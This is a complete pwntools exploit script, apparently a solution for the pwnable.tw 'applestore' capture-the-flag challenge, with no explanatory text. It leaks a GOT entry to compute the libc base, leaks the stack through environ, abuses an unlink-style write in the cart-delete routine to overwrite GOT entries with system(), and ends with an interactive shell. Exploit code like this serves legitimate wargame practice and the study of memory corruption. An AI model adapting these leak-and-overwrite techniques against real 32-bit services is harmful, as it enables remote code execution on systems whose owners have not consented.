from pwn import *

context.log_level='DEBUG'

elf=ELF('./applestore')
local=1
if local:
	p=process('./applestore')
	libc=ELF('/lib/i386-linux-gnu/libc-2.28.so')
else:
	p=remote('chall.pwnable.tw',10104)
	libc=ELF('./libc_32.so.6')

def add(idx):
	p.sendlineafter('>','2')
	p.sendlineafter('Device Number> ',str(idx))

def delete(idx):
	p.sendlineafter('>','3')
	p.sendlineafter('Item Number>',str(idx))

def checkout():
	p.sendlineafter('>','5')
	p.sendlineafter('>','y')

def cart(payload):
	p.sendlineafter('>','4')
	p.sendlineafter('>',str(payload))

for i in range(0,18):
	add(1)
add(2)
for i in range(0,2):
	add(4)
for i in range(0,5):
	add(3)

checkout()

payload='y\x0a'+p32(elf.got['read'])+p32(1)+p32(0)+p32(0)
cart(payload)
p.recvuntil('27: ')
read_got=u32(p.recv(4))
libc.address=read_got-libc.sym['read']
env=libc.sym['environ']
success('libc_base:'+hex(libc.address))
success('read_got:'+hex(read_got))

payload='y\x0a'+p32(env)+p32(1)+p32(0)+p32(0)
cart(payload)
p.recvuntil('27: ')
stack_env=u32(p.recv(4))
success('stack_env:'+hex(stack_env))
ebp=stack_env-0x104
success('stack_ebp:'+hex(ebp))

asprintf_got=elf.got['asprintf']
atoi_got=elf.got['atoi']
sys=libc.sym['system']
payload='27'+p32(sys)+p32(1)+p32(ebp-12)+p32(asprintf_got+0x22)

if local:
	gdb.attach(p,gdbscript='''
		b *0x080489F0\n
		b *0x08048A6F\n
		b *0x8048c0b\n
	''')
	pause()
delete(payload)

p.recvuntil('from your shopping cart.')
payload='$0\x00\x00'+p32(sys)
p.sendline(payload)

p.interactive()